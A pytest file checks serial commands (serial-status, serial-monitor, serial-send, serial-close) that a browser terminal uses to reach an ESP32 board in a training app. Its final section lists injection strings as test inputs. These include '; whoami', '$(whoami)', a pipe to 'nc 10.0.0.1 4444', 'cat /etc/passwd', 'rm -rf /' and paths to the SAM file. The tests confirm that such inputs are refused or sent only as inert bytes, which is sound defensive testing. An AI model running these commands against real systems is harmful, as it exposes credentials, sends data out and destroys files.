"""Phase 2A verification: the serial commands and their WebSocket path.

    xterm.js -> /ws/hack -> router -> serial command -> SerialTransport -> ESP32

Two questions this file answers:

1. Does a student's word reach the RIGHT physical port? The canonical
   `/dev/ttyUSB0` training path must resolve to whatever `DeviceState.port`
   actually is — `COM3` on the development machine — and only that real
   address may reach the transport.

2. Is the terminal still not a shell? Real hardware access is the most
   plausible excuse for loosening the command boundary, so the boundary is
   re-asserted here against the serial commands specifically.

No board and no pyserial: the shared `device_monitor` is pointed at a fake
device and every transport is built over a fake port.
"""

from __future__ import annotations

import asyncio

import pytest
from fastapi.testclient import TestClient

from app.commands import CommandContext, CommandRouter, build_default_registry
from app.hardware import DeviceState, DeviceStatus, device_monitor
from app.hardware.serial_alias import serial_representations
from app.hardware import serial_transport
from app.hardware.serial_transport import SerialTransport
from app.main import app
from app.sessions import HackSession
from tests.test_serial_transport import FakeSerialPort, RecordingFactory

CANONICAL = "/dev/ttyUSB0"
REAL_PORT = "COM3"


def attached(port: str = REAL_PORT) -> DeviceState:
    """The shared state for a board detected on `port`."""
    return DeviceState(
        status=DeviceStatus.CONNECTED,
        port=port,
        board="ESP32 Dev Module",
        mac="20:9b:a9:88:0b:e4",
        panel="SMART HOME MQTT CONTROL SYSTEM",
        port_aliases=serial_representations(port),
    )


@pytest.fixture
def board(monkeypatch: pytest.MonkeyPatch):
    """Point the SHARED device state at a detected board, with no hardware.

    The process-wide `device_monitor` is used rather than a private one on
    purpose: the serial commands must read the same state the header reads,
    and swapping in a different monitor would test the wrong object.
    """

    def install(state: DeviceState = None) -> DeviceState:
        resolved = state if state is not None else attached()
        monkeypatch.setattr(device_monitor, "_state", resolved)
        return resolved

    install()
    yield install
    device_monitor.reset()


@pytest.fixture
def port() -> FakeSerialPort:
    return FakeSerialPort()


@pytest.fixture
def context(port: FakeSerialPort) -> CommandContext:
    """A session whose transport is backed by a fake port."""
    session = HackSession(session_id="serial-test")
    session.serial = SerialTransport(factory=RecordingFactory(port))
    return CommandContext(session=session)


@pytest.fixture
def router() -> CommandRouter:
    return CommandRouter(build_default_registry())


def run(router: CommandRouter, line: str, context: CommandContext):
    return asyncio.run(router.dispatch(line, context))


def text(result) -> str:
    return "\n".join(result.lines)


def factory_of(context: CommandContext) -> RecordingFactory:
    return context.session.serial._factory  # noqa: SLF001 - inspecting the double


# --- 1: serial-status -------------------------------------------------------


def test_status_reports_the_attached_board_and_a_closed_link(
    router: CommandRouter, context: CommandContext, board
) -> None:
    out = text(run(router, "serial-status", context))

    assert "SMART HOME MQTT CONTROL SYSTEM" in out
    assert REAL_PORT in out
    assert "115200" in out
    assert "closed" in out


def test_status_shows_the_canonical_path_beside_the_real_port(
    router: CommandRouter, context: CommandContext, board
) -> None:
    """A student on Windows must see both the path the courseware uses and
    the port actually being opened, without guessing which is real."""
    out = text(run(router, "serial-status", context))

    assert REAL_PORT in out
    assert CANONICAL in out


def test_status_opens_nothing(
    router: CommandRouter, context: CommandContext, board
) -> None:
    run(router, "serial-status", context)

    assert factory_of(context).calls == []
    assert context.session.serial.is_open is False


def test_status_with_no_board_says_so_without_erroring(
    router: CommandRouter, context: CommandContext, board
) -> None:
    board(DeviceState(status=DeviceStatus.DISCONNECTED))

    result = run(router, "serial-status", context)

    assert "no ESP32 detected" in text(result)
    assert result.exit_code == 0


# --- 2: the canonical path resolves to the real port ------------------------


def test_monitor_opens_the_real_port_not_the_canonical_alias(
    router: CommandRouter, context: CommandContext, board
) -> None:
    """THE CENTRAL GUARANTEE of the alias design.

    The student says `/dev/ttyUSB0`; the OS is handed `COM3`. If this ever
    inverted, the transport would try to open a device node that does not
    exist on this host.
    """
    run(router, f"serial-monitor {CANONICAL}", context)

    assert factory_of(context).addresses == [REAL_PORT]
    assert context.session.serial.address == REAL_PORT


def test_monitor_with_no_target_uses_the_attached_board(
    router: CommandRouter, context: CommandContext, board
) -> None:
    run(router, "serial-monitor", context)

    assert factory_of(context).addresses == [REAL_PORT]


def test_monitor_accepts_the_real_port_too(
    router: CommandRouter, context: CommandContext, board
) -> None:
    run(router, f"serial-monitor {REAL_PORT}", context)

    assert factory_of(context).addresses == [REAL_PORT]


def test_a_linux_board_on_ttyacm0_still_resolves_from_the_canonical_path(
    router: CommandRouter, context: CommandContext, board
) -> None:
    """Courseware says /dev/ttyUSB0; the Pi enumerated /dev/ttyACM0."""
    board(attached("/dev/ttyACM0"))

    run(router, f"serial-monitor {CANONICAL}", context)

    assert factory_of(context).addresses == ["/dev/ttyACM0"]


def test_an_unknown_target_is_refused_and_opens_nothing(
    router: CommandRouter, context: CommandContext, board
) -> None:
    result = run(router, "serial-monitor /dev/ttyS9", context)

    assert "unknown serial target" in text(result)
    assert result.exit_code != 0
    assert factory_of(context).calls == []


def test_commands_refuse_to_act_when_no_board_is_attached(
    router: CommandRouter, context: CommandContext, board
) -> None:
    board(DeviceState(status=DeviceStatus.DISCONNECTED))

    for line in ("serial-monitor", "serial-send HELLO"):
        result = run(router, line, context)
        assert "no ESP32 is connected" in text(result)
        assert result.exit_code != 0
    assert factory_of(context).calls == []


# --- 3: serial-send ---------------------------------------------------------


def test_send_writes_the_payload_with_a_trailing_newline(
    router: CommandRouter, context: CommandContext, port: FakeSerialPort, board
) -> None:
    run(router, "serial-send HELLO", context)

    assert bytes(port.written) == b"HELLO\n"


def test_send_opens_the_link_on_demand(
    router: CommandRouter, context: CommandContext, port: FakeSerialPort, board
) -> None:
    """One command is enough to prove the link, and it says it opened it."""
    result = run(router, "serial-send HELLO", context)

    assert factory_of(context).addresses == [REAL_PORT]
    assert "opened" in text(result)
    assert bytes(port.written) == b"HELLO\n"
    # The reported count is bytes actually put on the wire, not characters
    # typed: "HELLO" is five characters but six bytes with its terminator.
    assert "sent 6 bytes" in text(result)


def test_the_reported_byte_count_covers_multibyte_characters(
    router: CommandRouter, context: CommandContext, port: FakeSerialPort, board
) -> None:
    """A degree sign is one character but two bytes on the wire.

    "21°C" is four characters; with its terminator it is six bytes, which is
    what the board actually receives and what the count must report.
    """
    result = run(router, "serial-send 21°C", context)

    written = bytes(port.written)
    assert written == "21°C\n".encode("utf-8")
    assert len(written) == 6
    assert "sent 6 bytes" in text(result)


def test_send_accepts_an_explicit_canonical_target_before_the_text(
    router: CommandRouter, context: CommandContext, port: FakeSerialPort, board
) -> None:
    run(router, f"serial-send {CANONICAL} HELLO", context)

    assert factory_of(context).addresses == [REAL_PORT]
    assert bytes(port.written) == b"HELLO\n"


def test_send_joins_multiple_words(
    router: CommandRouter, context: CommandContext, port: FakeSerialPort, board
) -> None:
    run(router, "serial-send QK774 STATUS", context)

    assert bytes(port.written) == b"QK774 STATUS\n"


def test_send_keeps_a_quoted_payload_intact(
    router: CommandRouter, context: CommandContext, port: FakeSerialPort, board
) -> None:
    run(router, 'serial-send "QK774:SET 1"', context)

    assert bytes(port.written) == b"QK774:SET 1\n"


def test_send_without_text_reports_usage_and_writes_nothing(
    router: CommandRouter, context: CommandContext, port: FakeSerialPort, board
) -> None:
    result = run(router, "serial-send", context)

    assert "usage: serial-send" in text(result)
    assert result.exit_code != 0
    assert bytes(port.written) == b""


def test_an_oversized_payload_is_refused(
    router: CommandRouter, context: CommandContext, port: FakeSerialPort, board
) -> None:
    """The device-facing bound, which is tighter than the parser's line cap.

    It has to be tighter to be reachable at all — see
    `config.MAX_SERIAL_SEND_CHARS`.
    """
    from app import config
    from app.commands.parser import MAX_COMMAND_CHARS

    assert config.MAX_SERIAL_SEND_CHARS < MAX_COMMAND_CHARS, (
        "the payload cap must stay under the line cap, or it never fires"
    )
    payload = "z" * (config.MAX_SERIAL_SEND_CHARS + 1)

    result = run(router, f"serial-send {payload}", context)

    assert "exceeds" in text(result)
    assert result.exit_code != 0
    assert bytes(port.written) == b""


def test_a_payload_at_the_limit_is_accepted(
    router: CommandRouter, context: CommandContext, port: FakeSerialPort, board
) -> None:
    from app import config

    payload = "z" * config.MAX_SERIAL_SEND_CHARS

    run(router, f"serial-send {payload}", context)

    assert bytes(port.written) == (payload + chr(10)).encode("utf-8")


def test_a_write_failure_becomes_one_controlled_terminal_line(
    router: CommandRouter, context: CommandContext, board
) -> None:
    broken = FakeSerialPort(write_error=OSError("device disconnected"))
    context.session.serial = SerialTransport(factory=RecordingFactory(broken))

    result = run(router, "serial-send HELLO", context)

    out = text(result)
    assert out.startswith("serial:")
    assert result.exit_code != 0
    assert "Traceback" not in out and "OSError" not in out


def test_a_port_that_will_not_open_becomes_one_controlled_terminal_line(
    router: CommandRouter, context: CommandContext, board
) -> None:
    context.session.serial = SerialTransport(
        factory=RecordingFactory(error=OSError("Access is denied."))
    )

    result = run(router, "serial-monitor", context)

    out = text(result)
    assert "serial:" in out
    assert REAL_PORT in out
    assert result.exit_code != 0


# --- 4: serial-close --------------------------------------------------------


def test_close_releases_the_port(
    router: CommandRouter, context: CommandContext, port: FakeSerialPort, board
) -> None:
    run(router, "serial-monitor", context)
    result = run(router, "serial-close", context)

    assert port.closed is True
    assert context.session.serial.is_open is False
    assert REAL_PORT in text(result)


def test_close_with_nothing_open_is_not_an_error(
    router: CommandRouter, context: CommandContext, board
) -> None:
    result = run(router, "serial-close", context)

    assert "no connection is open" in text(result)
    assert result.exit_code == 0


def test_monitoring_twice_does_not_reopen_and_reset_the_board(
    router: CommandRouter, context: CommandContext, board
) -> None:
    run(router, "serial-monitor", context)
    result = run(router, "serial-monitor", context)

    assert len(factory_of(context).calls) == 1
    assert "already monitoring" in text(result)


# --- 5: over the real WebSocket --------------------------------------------
#
# These drive the production wiring end to end: a real session, the real
# router, the real pump. Only the physical port is replaced — by patching the
# module-level default factory `SerialTransport.__init__` resolves when
# nothing is injected, which is exactly the seam production uses.


@pytest.fixture
def client() -> TestClient:
    with TestClient(app) as test_client:
        yield test_client


@pytest.fixture
def fake_ports(monkeypatch: pytest.MonkeyPatch):
    """Give every new session's transport a fake port. Returns the list."""
    created: list[FakeSerialPort] = []

    def install(chunks: tuple[bytes, ...] = (), *, read_error: Exception | None = None):
        def factory(address: str, baud: int, read_timeout: float) -> FakeSerialPort:
            fake = FakeSerialPort(chunks, read_error=read_error)
            created.append(fake)
            return fake

        monkeypatch.setattr(serial_transport, "open_pyserial_port", factory)
        return created

    return install


def _open_session(ws) -> str:
    session_frame = ws.receive_json()
    assert session_frame["type"] == "session"
    banner = ws.receive_json()
    assert banner["type"] == "output"
    return session_frame["session_id"]


def _run(ws, line: str) -> str:
    ws.send_json({"type": "input", "data": line})
    frame = ws.receive_json()
    assert frame["type"] == "output", frame
    return frame["data"]


def test_serial_status_works_over_the_websocket(client: TestClient, board) -> None:
    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        out = _run(ws, "serial-status")

    assert REAL_PORT in out
    assert "SMART HOME MQTT CONTROL SYSTEM" in out


def test_the_boards_output_reaches_the_terminal(
    client: TestClient, board, fake_ports
) -> None:
    """THE PHASE'S POINT: bytes from the device appear in xterm.js.

    A fake port stands in for the ESP32 and "sends" a line; the pump must
    forward it as an ordinary `output` frame, newline-normalised for a raw
    terminal, with nothing invented along the way.
    """
    fake_ports((b"QK774:READY\n",))

    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        assert "monitoring" in _run(ws, "serial-monitor")
        streamed = ws.receive_json()

    assert streamed["type"] == "output"
    assert streamed["data"] == "QK774:READY\r\n"


def test_send_then_the_boards_reply_reaches_the_terminal(
    client: TestClient, board, fake_ports
) -> None:
    """`serial-send` writes, and whatever the board answers is streamed."""
    ports = fake_ports()

    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        assert "sent" in _run(ws, "serial-send HELLO")
        # Stand in for the firmware answering on its own schedule.
        ports[0].feed(b"ACK HELLO\n")
        streamed = ws.receive_json()

    assert bytes(ports[0].written) == b"HELLO\n"
    assert streamed["data"] == "ACK HELLO\r\n"


def test_a_disconnected_board_reports_cleanly_and_leaves_the_socket_usable(
    client: TestClient, board, fake_ports
) -> None:
    """Requirement 11: an unplug must not crash or wedge the session."""
    fake_ports(read_error=OSError("device not configured"))

    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        _run(ws, "serial-monitor")

        notice = ws.receive_json()
        assert notice["type"] == "output"
        assert "lost" in notice["data"]

        # The terminal still works afterwards — this is the real assertion.
        assert "command not found" in _run(ws, "definitely-not-a-command")


def test_reconnecting_after_a_loss_works_within_one_session(
    client: TestClient, board, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Plug the board back in, re-run the command, and the link recovers."""
    ports: list[FakeSerialPort] = []

    def factory(address: str, baud: int, read_timeout: float) -> FakeSerialPort:
        # First open dies mid-stream; the second is a healthy board.
        fake = (
            FakeSerialPort(read_error=OSError("device not configured"))
            if not ports
            else FakeSerialPort((b"back online\n",))
        )
        ports.append(fake)
        return fake

    monkeypatch.setattr(serial_transport, "open_pyserial_port", factory)

    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        _run(ws, "serial-monitor")
        assert "lost" in ws.receive_json()["data"]

        _run(ws, "serial-monitor")
        streamed = ws.receive_json()

    assert streamed["data"] == "back online\r\n"
    assert len(ports) == 2


def test_serial_output_does_not_become_scenario_activity(
    client: TestClient, board, fake_ports
) -> None:
    """Physical serial traffic is not something the student did in the
    exercise: it must not appear as an `event` or move scenario state."""
    fake_ports((b"telemetry 21.5\n",))

    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        _run(ws, "serial-monitor")
        streamed = ws.receive_json()

    assert streamed["type"] == "output"
    assert streamed["type"] not in {"event", "state"}


def test_the_port_is_released_when_the_student_disconnects(
    client: TestClient, board, fake_ports
) -> None:
    """REGRESSION: teardown runs on an already-cancelled task.

    The server cancels the endpoint task on disconnect, so any `await` in
    the cleanup path raises `CancelledError` immediately and abandons the
    rest of it. An earlier version awaited, and therefore never closed the
    port at all — it stayed held for the life of the process, which also
    blocked Build Mode from flashing that same board. Teardown is now
    synchronous; this test is what keeps it that way.
    """
    ports = fake_ports()

    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        _run(ws, "serial-monitor")

    assert ports and ports[0].closed is True, "the serial port outlived the WebSocket"


def test_the_session_is_unregistered_when_the_student_disconnects(
    client: TestClient, board, fake_ports
) -> None:
    """The other half of the same leak: the session registry entry.

    Removing it used to await an async lock in the same doomed `finally`,
    so finished sessions — and their scenarios — accumulated forever.
    """
    from app.sessions import session_manager

    fake_ports()
    before = asyncio.run(session_manager.count())

    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        _run(ws, "serial-monitor")

    assert asyncio.run(session_manager.count()) == before


def test_teardown_releases_the_port_even_with_no_serial_link_open(
    client: TestClient, board, fake_ports
) -> None:
    """The ordinary case: a student who never ran a serial command."""
    ports = fake_ports()

    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        _run(ws, "help")

    assert ports == [], "nothing should have been opened"


def test_two_sessions_do_not_share_a_serial_link(
    client: TestClient, board, fake_ports
) -> None:
    ports = fake_ports()

    with client.websocket_connect("/ws/hack") as first:
        _open_session(first)
        _run(first, "serial-monitor")
        with client.websocket_connect("/ws/hack") as second:
            _open_session(second)
            _run(second, "serial-monitor")

    assert len(ports) == 2, "each session must open its own port"
    assert all(fake.closed for fake in ports)


def test_hardware_polling_still_never_touches_the_terminal(
    client: TestClient, board, fake_ports
) -> None:
    """Phase 1's silence rule survives Phase 2A's streaming pump."""
    fake_ports()

    with client.websocket_connect("/ws/hack") as ws:
        _open_session(ws)
        ws.send_json({"type": "hardware_status"})
        frame = ws.receive_json()

    assert frame["type"] == "hardware"


# --- 6: still not a shell ---------------------------------------------------


@pytest.mark.parametrize(
    "line",
    [
        "serial-send HELLO; whoami",
        "serial-send HELLO && id",
        "serial-send $(whoami)",
        "serial-send `id`",
        "serial-send HELLO | nc 10.0.0.1 4444",
        "serial-monitor /dev/ttyUSB0; cat /etc/passwd",
    ],
)
def test_shell_metacharacters_are_refused_before_any_serial_io(
    router: CommandRouter, context: CommandContext, port: FakeSerialPort, board, line: str
) -> None:
    """The parser rejects these as syntax, so no port is ever opened."""
    result = run(router, line, context)

    assert "syntax error" in text(result)
    assert factory_of(context).calls == []
    assert bytes(port.written) == b""


@pytest.mark.parametrize(
    "line",
    ["bash", "sh -c whoami", "python -c print(1)", "os.system('id')", "eval", "exec"],
)
def test_shell_like_commands_are_simply_unknown(
    router: CommandRouter, context: CommandContext, board, line: str
) -> None:
    """There is no entry for them in the closed registry — the only table
    a command name is ever resolved against."""
    result = run(router, line, context)
    out = text(result)

    assert "command not found" in out or "syntax error" in out
    assert context.session.serial.is_open is False


def test_a_shell_looking_payload_is_transmitted_as_inert_bytes(
    router: CommandRouter, context: CommandContext, port: FakeSerialPort, board
) -> None:
    """Quoted, it is legal input — and it still only ever reaches a UART.

    Nothing parses or executes it here; the ESP32 firmware decides what to
    make of it, which is the whole point of a serial link.
    """
    run(router, 'serial-send "rm -rf /"', context)

    assert bytes(port.written) == b"rm -rf /\n"
    assert context.session.serial.is_open is True


def test_a_serial_target_cannot_name_an_arbitrary_filesystem_path(
    router: CommandRouter, context: CommandContext, board
) -> None:
    """A target is matched against the attached board's names, never opened
    as a path — so it cannot be used to reach a file."""
    for target in ("/etc/passwd", "C:/Windows/System32/config/SAM", "../../secret"):
        result = run(router, f"serial-monitor {target}", context)
        assert "unknown serial target" in text(result)
    assert factory_of(context).calls == []
